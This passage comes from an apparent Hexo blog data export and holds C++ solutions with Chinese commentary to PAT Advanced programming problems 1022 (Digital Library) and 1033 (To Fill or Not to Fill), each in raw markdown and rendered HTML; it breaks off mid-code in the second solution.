class=\"number\">60</span>);</div><div class=\"line\">\t\t<span class=\"built_in\">else</span> f[i] = <span class=\"built_in\">point</span>(<span class=\"number\">18</span>, <span class=\"number\">0</span>);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">while</span> (q--)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tscanf(<span class=\"string\">\"%d\"</span>, &amp;x);</div><div class=\"line\">\t\t(f[x].x &lt; <span class=\"number\">18</span>) ? printf(<span class=\"string\">\"%02d:%02d\\n\"</span>, f[x].x, f[x].y) : printf(<span class=\"string\">\"Sorry\\n\"</span>);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>"},{"title":"PAT advanced 1022","date":"2017-02-22T09:31:15.000Z","_content":"\n## Description\n\n> 1022.Digital Library\n\n> A Digital Library contains millions of books, stored according to their titles, authors, key words of their abstracts, publishers, and published years. Each book is assigned an unique 7-digit number as its ID. Given any query from a reader, you are supposed to output the resulting books, sorted in increasing order of their ID's.\n\n> Input Specification:\n\n> Each input file contains one test case. For each case, the first line contains a positive integer N (<=10000) which is the total number of books. Then N blocks follow, each contains the information of a book in 6 lines:\n\n> Line \\#1: the 7-digit ID number;\nLine \\#2: the book title -- a string of no more than 80 characters;\nLine \\#3: the author -- a string of no more than 80 characters;\nLine \\#4: the key words -- each word is a string of no more than 10 characters without any white space, and the keywords are separated by exactly one space;\nLine \\#5: the publisher -- a string of no more than 80 characters;\nLine \\#6: the published year -- a 4-digit number which is in the range [1000, 3000].\nIt is assumed that each book belongs to one author only, and contains no more than 5 key words; there are no more than 1000 distinct key words in total; and there are no more than 1000 distinct publishers.\n\n> After the book information, there is a line containing a positive integer M (<=1000) which is the number of user's search queries. Then M lines follow, each in one of the formats shown below:\n\n> 1: a book title\n2: name of an author\n3: a key word\n4: name of a publisher\n5: a 4-digit number representing the year\nOutput Specification:\n\n> For each query, first print the original query in a line, then output the resulting book ID's in increasing order, each occupying a line. If no book is found, print \"Not Found\" instead.\n\n> Sample Input:\n3\n1111111\nThe Testing Book\nYue Chen\ntest code debug sort keywords\nZUCS Print\n2011\n3333333\nAnother Testing Book\nYue Chen\ntest code sort keywords\nZUCS Print2\n2012\n2222222\nThe Testing Book\nCYLL\nkeywords debug book\nZUCS Print2\n2011\n6\n1: The Testing Book\n2: Yue Chen\n3: keywords\n4: ZUCS Print\n5: 2011\n3: blablabla\n\n> Sample Output:\n1: The Testing Book\n1111111\n2222222\n2: Yue Chen\n1111111\n3333333\n3: keywords\n1111111\n2222222\n3333333\n4: ZUCS Print\n1111111\n5: 2011\n1111111\n2222222\n3: blablabla\nNot Found\n\n哇题目都没看清的我居然过了，是写了个更鲁棒的代码？（笑）\n`map`+`set`的使用，第一遍超时，后来减少查找，增加映射过了- -\n\n## Code\n\n```\n#include<cstdio>\n#include<string>\n#include<iostream>\n#include<algorithm>\n#include<map>\n#include<set>\n\nusing namespace std;\ntypedef long long LL;\n\nconst int maxN = 1e4 + 10;\n\nset<string> s;\n\nint n, m;\nstring x, y, z;\n\nmap<string, set<string>> f;\n\nvoid fin(string x)\n{\n\tif (f.find(x) != f.end())\n\t\tfor (set<string>::iterator it = f[x].begin(); it != f[x].end(); it++)\n\t\t\tcout << *it << endl;\n\telse\n\t\tcout << \"Not Found\" << endl;\n}\n\nint main()\n{\n\tscanf(\"%d\\n\", &n);\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tgetline(cin, x);\n\t\tgetline(cin, y);\n\t\tf[y].insert(x);\n\t\tgetline(cin, y);\n\t\tf[y].insert(x);\n\t\twhile (true)\n\t\t{\n\t\t\tcin >> y;\n\t\t\tf[y].insert(x);\n\t\t\tif (getchar() == '\\n')\n\t\t\t\tbreak;\n\t\t}\n\t\tgetline(cin, y);\n\t\tf[y].insert(x);\n\t\tgetline(cin, y);\n\t\tf[y].insert(x);\n\t}\n\tscanf(\"%d\\n\", &m);\n\tfor (int i = 0; i < m; i++)\n\t{\n\t\tgetline(cin, y);\n\t\tcout << y << endl;\n\t\tz = y.substr(3, y.size());\n\t\tfin(z);\n\t}\n\treturn 0;\n}\n```","source":"_posts/PAT-advanced-1022.md","raw":"---\ntitle: PAT advanced 1022\ntags:\n  - PAT\ncategories: []\ndate: 2017-02-22 17:31:15\n---\n\n## Description\n\n> 1022.Digital Library\n\n> A Digital Library contains millions of books, stored according to their titles, authors, key words of their abstracts, publishers, and published years. Each book is assigned an unique 7-digit number as its ID. Given any query from a reader, you are supposed to output the resulting books, sorted in increasing order of their ID's.\n\n> Input Specification:\n\n> Each input file contains one test case. For each case, the first line contains a positive integer N (<=10000) which is the total number of books. Then N blocks follow, each contains the information of a book in 6 lines:\n\n> Line \\#1: the 7-digit ID number;\nLine \\#2: the book title -- a string of no more than 80 characters;\nLine \\#3: the author -- a string of no more than 80 characters;\nLine \\#4: the key words -- each word is a string of no more than 10 characters without any white space, and the keywords are separated by exactly one space;\nLine \\#5: the publisher -- a string of no more than 80 characters;\nLine \\#6: the published year -- a 4-digit number which is in the range [1000, 3000].\nIt is assumed that each book belongs to one author only, and contains no more than 5 key words; there are no more than 1000 distinct key words in total; and there are no more than 1000 distinct publishers.\n\n> After the book information, there is a line containing a positive integer M (<=1000) which is the number of user's search queries. Then M lines follow, each in one of the formats shown below:\n\n> 1: a book title\n2: name of an author\n3: a key word\n4: name of a publisher\n5: a 4-digit number representing the year\nOutput Specification:\n\n> For each query, first print the original query in a line, then output the resulting book ID's in increasing order, each occupying a line. If no book is found, print \"Not Found\" instead.\n\n> Sample Input:\n3\n1111111\nThe Testing Book\nYue Chen\ntest code debug sort keywords\nZUCS Print\n2011\n3333333\nAnother Testing Book\nYue Chen\ntest code sort keywords\nZUCS Print2\n2012\n2222222\nThe Testing Book\nCYLL\nkeywords debug book\nZUCS Print2\n2011\n6\n1: The Testing Book\n2: Yue Chen\n3: keywords\n4: ZUCS Print\n5: 2011\n3: blablabla\n\n> Sample Output:\n1: The Testing Book\n1111111\n2222222\n2: Yue Chen\n1111111\n3333333\n3: keywords\n1111111\n2222222\n3333333\n4: ZUCS Print\n1111111\n5: 2011\n1111111\n2222222\n3: blablabla\nNot Found\n\n哇题目都没看清的我居然过了，是写了个更鲁棒的代码？（笑）\n`map`+`set`的使用，第一遍超时，后来减少查找，增加映射过了- -\n\n## Code\n\n```\n#include<cstdio>\n#include<string>\n#include<iostream>\n#include<algorithm>\n#include<map>\n#include<set>\n\nusing namespace std;\ntypedef long long LL;\n\nconst int maxN = 1e4 + 10;\n\nset<string> s;\n\nint n, m;\nstring x, y, z;\n\nmap<string, set<string>> f;\n\nvoid fin(string x)\n{\n\tif (f.find(x) != f.end())\n\t\tfor (set<string>::iterator it = f[x].begin(); it != f[x].end(); it++)\n\t\t\tcout << *it << endl;\n\telse\n\t\tcout << \"Not Found\" << endl;\n}\n\nint main()\n{\n\tscanf(\"%d\\n\", &n);\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tgetline(cin, x);\n\t\tgetline(cin, y);\n\t\tf[y].insert(x);\n\t\tgetline(cin, y);\n\t\tf[y].insert(x);\n\t\twhile (true)\n\t\t{\n\t\t\tcin >> y;\n\t\t\tf[y].insert(x);\n\t\t\tif (getchar() == '\\n')\n\t\t\t\tbreak;\n\t\t}\n\t\tgetline(cin, y);\n\t\tf[y].insert(x);\n\t\tgetline(cin, y);\n\t\tf[y].insert(x);\n\t}\n\tscanf(\"%d\\n\", &m);\n\tfor (int i = 0; i < m; i++)\n\t{\n\t\tgetline(cin, y);\n\t\tcout << y << endl;\n\t\tz = y.substr(3, y.size());\n\t\tfin(z);\n\t}\n\treturn 0;\n}\n```","slug":"PAT-advanced-1022","published":1,"updated":"2017-02-22T09:38:54.694Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k030027hv18ftsfzb02","content":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1022.Digital Library</p>\n<p>A Digital Library contains millions of books, stored according to their titles, authors, key words of their abstracts, publishers, and published years. Each book is assigned an unique 7-digit number as its ID. Given any query from a reader, you are supposed to output the resulting books, sorted in increasing order of their ID’s.</p>\n<p>Input Specification:</p>\n<p>Each input file contains one test case. For each case, the first line contains a positive integer N (&lt;=10000) which is the total number of books. Then N blocks follow, each contains the information of a book in 6 lines:</p>\n<p>Line #1: the 7-digit ID number;<br>Line #2: the book title – a string of no more than 80 characters;<br>Line #3: the author – a string of no more than 80 characters;<br>Line #4: the key words – each word is a string of no more than 10 characters without any white space, and the keywords are separated by exactly one space;<br>Line #5: the publisher – a string of no more than 80 characters;<br>Line #6: the published year – a 4-digit number which is in the range [1000, 3000].<br>It is assumed that each book belongs to one author only, and contains no more than 5 key words; there are no more than 1000 distinct key words in total; and there are no more than 1000 distinct publishers.</p>\n<p>After the book information, there is a line containing a positive integer M (&lt;=1000) which is the number of user’s search queries. Then M lines follow, each in one of the formats shown below:</p>\n<p>1: a book title<br>2: name of an author<br>3: a key word<br>4: name of a publisher<br>5: a 4-digit number representing the year<br>Output Specification:</p>\n<p>For each query, first print the original query in a line, then output the resulting book ID’s in increasing order, each occupying a line. If no book is found, print “Not Found” instead.</p>\n<p>Sample Input:<br>3<br>1111111<br>The Testing Book<br>Yue Chen<br>test code debug sort keywords<br>ZUCS Print<br>2011<br>3333333<br>Another Testing Book<br>Yue Chen<br>test code sort keywords<br>ZUCS Print2<br>2012<br>2222222<br>The Testing Book<br>CYLL<br>keywords debug book<br>ZUCS Print2<br>2011<br>6<br>1: The Testing Book<br>2: Yue Chen<br>3: keywords<br>4: ZUCS Print<br>5: 2011<br>3: blablabla</p>\n<p>Sample Output:<br>1: The Testing Book<br>1111111<br>2222222<br>2: Yue Chen<br>1111111<br>3333333<br>3: keywords<br>1111111<br>2222222<br>3333333<br>4: ZUCS Print<br>1111111<br>5: 2011<br>1111111<br>2222222<br>3: blablabla<br>Not Found</p>\n</blockquote>\n<p>哇题目都没看清的我居然过了，是写了个更鲁棒的代码？（笑）<br><code>map</code>+<code>set</code>的使用，第一遍超时，后来减少查找，增加映射过了- -</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;map&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;set&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxN = <span class=\"number\">1e4</span> + <span class=\"number\">10</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">set</span>&lt;<span class=\"built_in\">string</span>&gt; s;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> n, m;</div><div class=\"line\"><span class=\"built_in\">string</span> x, y, z;</div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">map</span>&lt;<span class=\"built_in\">string</span>, <span class=\"built_in\">set</span>&lt;<span class=\"built_in\">string</span>&gt;&gt; f;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">fin</span><span class=\"params\">(<span class=\"built_in\">string</span> x)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (f.find(x) != f.end())</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"built_in\">set</span>&lt;<span class=\"built_in\">string</span>&gt;::iterator it = f[x].begin(); it != f[x].end(); it++)</div><div class=\"line\">\t\t\t<span class=\"built_in\">cout</span> &lt;&lt; *it &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">\t<span class=\"keyword\">else</span></div><div class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"Not Found\"</span> &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\\n\"</span>, &amp;n);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tgetline(<span class=\"built_in\">cin</span>, x);</div><div class=\"line\">\t\tgetline(<span class=\"built_in\">cin</span>, y);</div><div class=\"line\">\t\tf[y].insert(x);</div><div class=\"line\">\t\tgetline(<span class=\"built_in\">cin</span>, y);</div><div class=\"line\">\t\tf[y].insert(x);</div><div class=\"line\">\t\t<span class=\"keyword\">while</span> (<span class=\"literal\">true</span>)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"built_in\">cin</span> &gt;&gt; y;</div><div class=\"line\">\t\t\tf[y].insert(x);</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (getchar() == <span class=\"string\">'\\n'</span>)</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\tgetline(<span class=\"built_in\">cin</span>, y);</div><div class=\"line\">\t\tf[y].insert(x);</div><div class=\"line\">\t\tgetline(<span class=\"built_in\">cin</span>, y);</div><div class=\"line\">\t\tf[y].insert(x);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\\n\"</span>, &amp;m);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; m; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tgetline(<span class=\"built_in\">cin</span>, y);</div><div class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; y &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">\t\tz = y.substr(<span class=\"number\">3</span>, y.size());</div><div class=\"line\">\t\tfin(z);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>","excerpt":"","more":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1022.Digital Library</p>\n<p>A Digital Library contains millions of books, stored according to their titles, authors, key words of their abstracts, publishers, and published years. Each book is assigned an unique 7-digit number as its ID. Given any query from a reader, you are supposed to output the resulting books, sorted in increasing order of their ID’s.</p>\n<p>Input Specification:</p>\n<p>Each input file contains one test case. For each case, the first line contains a positive integer N (&lt;=10000) which is the total number of books. Then N blocks follow, each contains the information of a book in 6 lines:</p>\n<p>Line #1: the 7-digit ID number;<br>Line #2: the book title – a string of no more than 80 characters;<br>Line #3: the author – a string of no more than 80 characters;<br>Line #4: the key words – each word is a string of no more than 10 characters without any white space, and the keywords are separated by exactly one space;<br>Line #5: the publisher – a string of no more than 80 characters;<br>Line #6: the published year – a 4-digit number which is in the range [1000, 3000].<br>It is assumed that each book belongs to one author only, and contains no more than 5 key words; there are no more than 1000 distinct key words in total; and there are no more than 1000 distinct publishers.</p>\n<p>After the book information, there is a line containing a positive integer M (&lt;=1000) which is the number of user’s search queries. Then M lines follow, each in one of the formats shown below:</p>\n<p>1: a book title<br>2: name of an author<br>3: a key word<br>4: name of a publisher<br>5: a 4-digit number representing the year<br>Output Specification:</p>\n<p>For each query, first print the original query in a line, then output the resulting book ID’s in increasing order, each occupying a line. If no book is found, print “Not Found” instead.</p>\n<p>Sample Input:<br>3<br>1111111<br>The Testing Book<br>Yue Chen<br>test code debug sort keywords<br>ZUCS Print<br>2011<br>3333333<br>Another Testing Book<br>Yue Chen<br>test code sort keywords<br>ZUCS Print2<br>2012<br>2222222<br>The Testing Book<br>CYLL<br>keywords debug book<br>ZUCS Print2<br>2011<br>6<br>1: The Testing Book<br>2: Yue Chen<br>3: keywords<br>4: ZUCS Print<br>5: 2011<br>3: blablabla</p>\n<p>Sample Output:<br>1: The Testing Book<br>1111111<br>2222222<br>2: Yue Chen<br>1111111<br>3333333<br>3: keywords<br>1111111<br>2222222<br>3333333<br>4: ZUCS Print<br>1111111<br>5: 2011<br>1111111<br>2222222<br>3: blablabla<br>Not Found</p>\n</blockquote>\n<p>哇题目都没看清的我居然过了，是写了个更鲁棒的代码？（笑）<br><code>map</code>+<code>set</code>的使用，第一遍超时，后来减少查找，增加映射过了- -</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;map&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;set&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxN = <span class=\"number\">1e4</span> + <span class=\"number\">10</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">set</span>&lt;<span class=\"built_in\">string</span>&gt; s;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> n, m;</div><div class=\"line\"><span class=\"built_in\">string</span> x, y, z;</div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">map</span>&lt;<span class=\"built_in\">string</span>, <span class=\"built_in\">set</span>&lt;<span class=\"built_in\">string</span>&gt;&gt; f;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">fin</span><span class=\"params\">(<span class=\"built_in\">string</span> x)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (f.find(x) != f.end())</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"built_in\">set</span>&lt;<span class=\"built_in\">string</span>&gt;::iterator it = f[x].begin(); it != f[x].end(); it++)</div><div class=\"line\">\t\t\t<span class=\"built_in\">cout</span> &lt;&lt; *it &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">\t<span class=\"keyword\">else</span></div><div class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"Not Found\"</span> &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\\n\"</span>, &amp;n);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tgetline(<span class=\"built_in\">cin</span>, x);</div><div class=\"line\">\t\tgetline(<span class=\"built_in\">cin</span>, y);</div><div class=\"line\">\t\tf[y].insert(x);</div><div class=\"line\">\t\tgetline(<span class=\"built_in\">cin</span>, y);</div><div class=\"line\">\t\tf[y].insert(x);</div><div class=\"line\">\t\t<span class=\"keyword\">while</span> (<span class=\"literal\">true</span>)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"built_in\">cin</span> &gt;&gt; y;</div><div class=\"line\">\t\t\tf[y].insert(x);</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (getchar() == <span class=\"string\">'\\n'</span>)</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\tgetline(<span class=\"built_in\">cin</span>, y);</div><div class=\"line\">\t\tf[y].insert(x);</div><div class=\"line\">\t\tgetline(<span class=\"built_in\">cin</span>, y);</div><div class=\"line\">\t\tf[y].insert(x);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\\n\"</span>, &amp;m);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; m; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tgetline(<span class=\"built_in\">cin</span>, y);</div><div class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; y &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">\t\tz = y.substr(<span class=\"number\">3</span>, y.size());</div><div class=\"line\">\t\tfin(z);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>"},{"title":"PAT advanced 1033","date":"2017-02-16T10:27:31.000Z","_content":"\n## Description\n\n> 1033.To Fill or Not to Fill (25)\n\n> With highways available, driving a car from Hangzhou to any other city is easy. But since the tank capacity of a car is limited, we have to find gas stations on the way from time to time. Different gas station may give different price. You are asked to carefully design the cheapest route to go.\n\n> Input Specification:\n\n> Each input file contains one test case. For each case, the first line contains 4 positive numbers: Cmax (<= 100), the maximum capacity of the tank; D (<=30000), the distance between Hangzhou and the destination city; Davg (<=20), the average distance per unit gas that the car can run; and N (<= 500), the total number of gas stations. Then N lines follow, each contains a pair of non-negative numbers: Pi, the unit gas price, and Di (<=D), the distance between this station and Hangzhou, for i=1,...N. All the numbers in a line are separated by a space.\n\n> Output Specification:\n\n> For each test case, print the cheapest price in a line, accurate up to 2 decimal places. It is assumed that the tank is empty at the beginning. If it is impossible to reach the destination, print \"The maximum travel distance = X\" where X is the maximum possible distance the car can run, accurate up to 2 decimal places.\n\n> Sample Input 1:\n50 1300 12 8\n6.00 1250\n7.00 600\n7.00 150\n7.10 0\n7.20 200\n7.50 400\n7.30 1000\n6.85 300\nSample Output 1:\n749.17\n\n> Sample Input 2:\n50 1300 12 2\n7.10 0\n7.00 600\nSample Output 2:\nThe maximum travel distance = 1200.00\n\n贪心算法： 遇到的最近的比当前加油站便宜的加油站，则加上足够到此车站的油；没有比当前车站便宜的，在当前车站加满油，到次便宜的车站；否则加满油，输出最远距离。\n\n**注意可能始发点没有加油站QAQ**\n\n## Code\n\n```\n#include<cstdio>  \n#include<string>  \n#include<cstring>  \n#include<vector>  \n#include<iostream>  \n#include<queue>  \n#include<algorithm>  \nusing namespace std;\ntypedef long long LL;\nconst int maxN = 5e2 + 10;\n\nint m, d, p, s;\n// the maximum capacity of the tank\n// the distance between Hangzhou and the destination city\n// the average distance per unit gas that the car can run   21\n// the total number of gas stations\n\nstruct sta\n{\n\tfloat x;\n\tfloat y;\n\tsta(float x = 0, float y = 0) :x(x), y(y){}\n}stat[maxN];\n\nfloat price;\nfloat dis = 0;\n\nfloat x;float y;\n\nbool gre()\n{\n\tint z = 0;\n\tfloat h = 0;\n\twhile (dis != d)\n\t{\n\t\tint flag = -1;\n\t\tint maxs = m * p + dis;\n\t\tif (stat[0].y != 0)\n\t\t\treturn 0;\n\t\tfor (int i = z + 1; i <= s; i++)\n\t\t{\n\t\t\tif (stat[i].x < stat[z].x && stat[i].y <= maxs)\n\t\t\t{\n\t\t\t\tflag = i;\n\t\t\t\tprice += (stat[flag].y - dis - h * p) / p * stat[z].x;\n\t\t\t\th += (stat[flag].y - dis - h * p) / p;\n\t\t\t\tdis = stat[flag].y;\n\t\t\t\th -= (stat[flag].y - stat[z].y) / p;\n\t\t\t\tz = flag;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tif (flag == -1)\n\t\t{\n\t\t\tif (stat[z + 1].y > maxs)\n\t\t\t{\n\t\t\t\tdis = maxs;\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tfloat tmp = stat[z + 1].x;\n\t\t\t\tflag = z + 1;\n\t\t\t\tfor (int i = z + 1; i <= s; i++)\n\t\t\t\t\tif (stat[i].y <= maxs && stat[i].x < tmp)\n\t\t\t\t\t{\n\t\t\t\t\t\tflag = i;\n\t\t\t\t\t\ttmp = stat[i].x;\n\t\t\t\t\t}\n\t\t\t\tprice += (m - h) * stat[z].x;\n\t\t\t\th += m - h;\n\t\t\t\tdis = stat[flag].y;\n\t\t\t\th -= (stat[flag].y - stat[z].y) / p;\n\t\t\t\tz = flag;\n\t\t\t}\n\t\t}\n\t}\n\treturn 1;\n}\nint main()\n{\n\tscanf(\"%d%d%d%d\", &m, &d, &p, &s);\n\tfor (int i = 0; i < s; i++)\n\t{\n\t\tscanf(\"%f\", &x);\n\t\tscanf(\"%f\", &y);\n\t\tstat[i] = sta(x, y);\n\t}\n\tstat[s] = sta(0, d);\n\tfor (int i = 0; i < s - 1; i++)\n\t\tfor (int j = i + 1; j < s; j++)\n\t\t\tif (stat[i].y > stat[j].y)\n\t\t\t\tswap(stat[i], stat[j]);\n\tgre() ? 